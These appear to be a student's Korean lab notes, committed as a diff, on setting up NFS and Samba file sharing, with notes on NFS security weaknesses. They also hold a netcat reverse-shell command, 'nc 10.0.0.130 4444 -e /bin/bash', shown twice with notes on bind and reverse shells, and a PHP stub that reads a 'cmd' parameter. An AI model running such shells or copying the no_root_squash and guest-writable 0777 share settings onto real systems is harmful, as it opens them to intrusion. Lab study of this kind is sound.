@@ -1,0 +1,166 @@
+
+alma
+
+root@roror:/home/roror# dnf install nfs-utils -y
+root@roror:/home/roror# vi /etc/idmapd.conf 
+root@roror:/home/roror# vi /etc/exports
+root@roror:/home/roror# systemctl enable --now rpcbind nfs-server
+root@roror:/home/roror# firewall-cmd --permanent --add-service=nfs
+root@roror:/home/roror# firewall-cmd --reload 
+
+
+
+
+nfs, samba - 파일공유
+host - * (모든 호스트)
+nfs - Linux and Linux
+samba - Wimdows and Linux
+
+NFS(Network File System)에서 공유 디렉터리를 만들고 내보낼(export) 때, “소유자를 누구로 할지”는 서버와 클라이언트의 접근 방식(익명 or 사용자 매핑)에 따라 달라진다. NFS는 파일 권한을 UID/GID(숫자 ID) 기준으로 관리한다. 즉 접근한 사람의 UID/GID 기준으로 디렉토리 권한을 부여 받는다.
+
+root@roror:/home/roror# vi /etc/exports
+  1 /home/nfs 10.0.0.0/24(rw,no_root_squash,async)
+
+root@roror:/home/roror# mkdir -p /home/nfs/{backup,share}
+root@roror:/home/roror# chown -R roror:roror /home/nfs/backup
+root@roror:/home/roror# chown -R nobody:nobody /home/nfs/share
+root@roror:/home/roror# systemctl restart nfs-server
+
+root@roror:/home/roror# firewall-cmd --permanent --add-service={nfs,rpc-bind,mountd}
+root@roror:/home/roror# firewall-cmd --reload 
+
+
+root@kali:/home/kali# mkdir /backup            
+root@kali:/home/kali# mount -t nfs 10.0.0.200:/home/nfs /backup 
+
+
+    (1) 접근디렉토리 허가할호스트(권한1,관한2) 허가할호스트(권한1,권한2)    
+    (2) # man exports (exports 옵션)  -  기본값은 root_squash, no_all_squas 이다.
+    (3) 모든 호스트 허용 : *(rw,root_squash,async) localhost(rw,no_root_squash,async) 192.168.123.100(rw,no_root_squash,async)
+
+
+   1) 마운트 # mount -t nfs 10.0.0.200:/home/nfs /backup 
+   2) 개별마운트(참고) # mount -t nfs 10.0.0.200:/home/nfs/backup /backup
+
+   3) root(client) 로 접속 : /etc/exports 설정값이 no_root_squash 이므로 접속시 같은 root 권한으로 사용
+     – no_root_squash : 클라이언트에서 root 사용자로 접근할 때 root 권한을 제한하지 않는다.(서버의 root와 매칭)
+     – root_squash : 클라이언트에서 root 사용자로 접근할 때 root 권한을 nobody(또는 nfsnobody) 사용자로 제한한다.
+ 
+   4) 일반 계정 접속시(기본 옵션 : no_all_squash) - client 사용자가 파일 복사시, 서버의 UID 동일한 사용자의 권한으로 실행된다.
+     – no_all_squash : root를 제외하고 자기자신의 ID(UID로 판단)와 동일하게 마운트하는 것이 기본이며, 서버와 동일한 ID로 마운트를 하도록 한다.
+     – all_squash : root를 제외하고 서버와 클라이언트의 사용자를 동일한 nobody(또는 nfsnobody) 권한으로 설정
+
+
+NFS 인증 및 외부 접속 관련
+ 1) NFS(Network File System)는 기본적으로 아이디/비밀번호 기반 인증을 사용하지 않는다. 즉, Samba(SMB)처럼 로그인 계정으로 접근하는 방식이 아니라, 클라이언트의 IP나 호스트명 기반으로 접근 제어를 한다.
+ 2) NFS는 원래 Unix/Linux 내부 네트워크 환경용으로 설계된 프로토콜이기 때문에, 같은 네트워크 상의 서버와 클라이언트 간에 IP주소와 UID/GID(사용자/그룹 ID) 를 기준으로 접근을 제어한다. 외부에서 접속은 기본은 안되고, ssh, vpn, sshfs 등을 이용해야한다.
+ 3) NFS는 TCP/UDP 포트 2049번(기본)과 함께 rpcbind (portmapper, TCP/UDP 111) 등의 서비스 포트를 사용한다.
+
+보안 취약     NFS는 기본적으로 암호 인증이 없음. IP 기반 접근만 허용해서 스푸핑 공격에 취약함.
+포트 다중 노출     111, 2049, 20048 등 여러 포트를 외부에 열어야 해서 방화벽 관리 어려움.
+UID/GID 의존     사용자 ID 숫자가 맞지 않으면 접근 권한이 꼬임 (외부 환경에선 일치 보장 불가).
+암호화 없음    데이터가 평문으로 오가기 때문에 외부 전송 시 위험.
+관리 복잡    NAT, VPN, 방화벽, rpcbind 포트 충돌 등 환경변수가 많음.
+
+
+NFS 서버가 공유한 디렉터리의 "상위 경로(subtree)"를 검사하지 않도록 하여 성능을 올리고 경로 관련 오류를 줄여주는 옵션.
+
+
+- 사용자 A, B, C 가 있다.   A,C(util) 디렉토리를 공유하도록 설정(group)
+
+
+- 함수(정의된, 사용자)
+empty("데이터 값, 문자,, 숫자... 값") ----> 리턴값(return) 을 1로 해준다 (True)
+$cmd="데이터"
+$result=empty($cmd);
+echo "<p>Result : $result</p>";
+
+empty("")  ----> 아무런 값이 없다 그러므로 0이다.  return 0;
+$cmd=""
+$result=empty($cmd);       // $cmd는 값이 없다. 그러므로 return 0; 이다.
+echo "<p>Result : $result</p>";
+
+
+http://example.com/test.php?cmd=ls         
+<?
+$cmd = $_GET["cmd"];             //  메소드가 $_GET["cmd"]; 이고 파라미터 cmd(변수)이고 값은 ls 이다.
+
+echo "DATA : ".empty($cmd);
+$result=empty($cmd);
+echo "<p>Result : $result</p>";
+if(empty($cmd))
+{
+	echo "<br>$cmd는 값이 없습니다.!";
+}
+?>
+
+
+ㅎ..
+
+
+nc 10.0.0.130 4444 -e /bin/bash
+
+
+- 방화벽(공격시)
+bind - 공격자가 서버로 접속할때
+reverse - 대상자(서버)가 공격자한테 접속할때
+
+nc 10.0.0.130 4444 -e /bin/bash (나의 shell을 OPEN)
+
+smbd 
+TCP 445, TCP 139 
+TCP 445는 SMB/CIFS프로토콜
+
+
+root@roror:/home/roror# dnf install samba samba-client -y
+
+root@roror:/home# vi /etc/samba/smb.conf
+ 10 [global]
+ 11         unix charset = UTF-8
+ 12         dos charset = CP949
+ 13         workgroup = WORKGROUP
+ 14         hosts allow = 10.0.0. 127.
+ 15         server string = Samba Server
+ 16         map to guest = Bad User
+ 17         security = user
+ 18         passdb backend = tdbsam
+
+ 51 [share]
+ 52 path = /home/share
+ 53 read only = no  // 읽기만 허용 아님.(쓰기도 가능)
+ 54 writable = yes  // 쓰기 가능..?
+ 55 guest ok = yes  // 게스트 허용
+ 56 guest only = yes  // 모두 게스트로
+ 57 create mode = 0777
+ 58 directory mode = 0777
+ 59 browseable mode = yes
+ 60 force user = nobody
+
+root@roror:/home# firewall-cmd --permanent --add-service={samba,samba-dc,samba-client}
+root@roror:/home# firewall-cmd --reload 
+root@roror:/home# systemctl enable --now smb nmb
+
+
+kali@kali:~$ smbclient -L //10.0.0.200
+kali@kali:~$ smbclient -L //10.0.0.200 -m SNB3 -N
+kali@kali:~$ smbclient //10.0.0.200/share -m SMB3 -N
+root@kali:/home/kali# mount -t cifs //10.0.0.200/share /share -o guest
+
+
+browseable = yes 기능
+
+Windows의 네트워크 환경(네트워크 브라우저)에 이 공유가 보이도록 허용하는 옵션
+
+\\10.0.0.200\share
+
+
+$ smbclient -L //10.0.0.200 -m SMB3 -N
+$ smbclient //10.0.0.200/share -m SMB3 -N
+# mount -t cifs //10.0.0.200/share /share -o guest
+
+
+
+
+
+
+
